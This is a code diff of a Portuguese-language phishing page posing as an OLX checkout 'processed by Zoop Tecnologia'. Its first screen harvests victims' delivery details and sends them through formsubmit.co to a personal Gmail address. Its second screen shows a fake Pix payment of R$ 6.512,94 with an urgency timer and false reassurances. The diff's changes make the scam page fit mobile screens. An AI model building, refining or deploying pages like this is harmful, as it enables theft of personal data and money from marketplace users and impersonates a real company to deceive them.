@@ -2,75 +2,104 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Envio e Pagamento</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f8f8f8;
+    * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
     }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+    }
+
     .container {
-      max-width: 420px;
-      margin: 30px auto;
-      background: white;
+      width: 100%;
+      max-width: 100%;
       padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      background: #fff;
+      min-height: 100vh;
     }
+
     h2 {
       margin-bottom: 20px;
+      text-align: center;
       color: #333;
     }
+
     input, textarea {
       width: 100%;
       margin-bottom: 12px;
-      padding: 10px;
+      padding: 14px;
       border: 1px solid #ccc;
       border-radius: 5px;
+      font-size: 16px;
     }
+
     button {
       background: #f60;
       color: white;
-      padding: 12px;
+      padding: 14px;
       border: none;
       width: 100%;
       border-radius: 5px;
       cursor: pointer;
       font-size: 16px;
     }
+
     .alerta {
       background: #fff4cc;
-      padding: 10px;
+      padding: 12px;
       border-radius: 5px;
-      font-size: 14px;
+      font-size: 15px;
       margin-bottom: 20px;
     }
+
     .alerta strong { font-weight: bold; }
-    .tempo { color: #f60; font-weight: bold; }
-    .valor { font-size: 22px; color: #333; margin: 10px 0; }
+
+    .tempo {
+      color: #f60;
+      font-weight: bold;
+    }
+
+    .valor {
+      font-size: 24px;
+      color: #333;
+      margin: 10px 0;
+    }
+
     .pix-code {
       background: #eee;
-      padding: 10px;
+      padding: 14px;
       border-radius: 5px;
       word-break: break-word;
-      margin: 10px 0;
-      font-size: 14px;
+      font-size: 15px;
+      margin-top: 10px;
     }
+
     ol {
       padding-left: 20px;
-      font-size: 14px;
+      font-size: 15px;
       color: #333;
+      margin-top: 20px;
     }
+
     a {
       color: purple;
       text-decoration: none;
     }
-    #pagamento { display: none; }
+
+    #pagamento {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
+  <!-- TELA 1 -->
   <div class="container" id="formulario">
     <h2>Preencha seus dados de entrega</h2>
     <form id="envioForm">
@@ -84,6 +113,7 @@
     </form>
   </div>
 
+  <!-- TELA 2 -->
   <div class="container" id="pagamento">
     <div class="alerta">
       ⚠️ Não pedimos comprovante do Pix e nem enviamos por e-mail. A OLX, em parceria com a <strong>Zoop Tecnologia</strong>, cuida do pagamento até você receber seu produto!
@@ -91,13 +121,13 @@
 
     <p><strong>Seu código expira em:</strong> <span class="tempo">04m 39s</span></p>
 
-    <div>
+    <div style="margin-top: 15px;">
       <p><strong>Pague por Pix</strong></p>
       <p class="valor">R$ 6.512,94</p>
       <p><strong>Processado por</strong><br>Zoop tecnologia</p>
     </div>
 
-    <p><strong>Copie o código de pagamento:</strong></p>
+    <p style="margin-top: 15px;"><strong>Copie o código de pagamento:</strong></p>
     <div class="pix-code" id="pixcode">00020101021226850014br.gov.bcb.pix.qr1234567890abcde</div>
     <button onclick="copiarPix()">Copiar código Pix</button>
 
@@ -116,7 +146,6 @@
 
     form.addEventListener("submit", function(e) {
       e.preventDefault();
-
       const formData = new FormData(form);
       fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
         method: "POST",
@@ -124,6 +153,7 @@
       }).then(() => {
         formulario.style.display = "none";
         pagamento.style.display = "block";
+        window.scrollTo(0, 0);
       }).catch(() => {
         alert("Erro ao enviar os dados. Tente novamente.");
       });
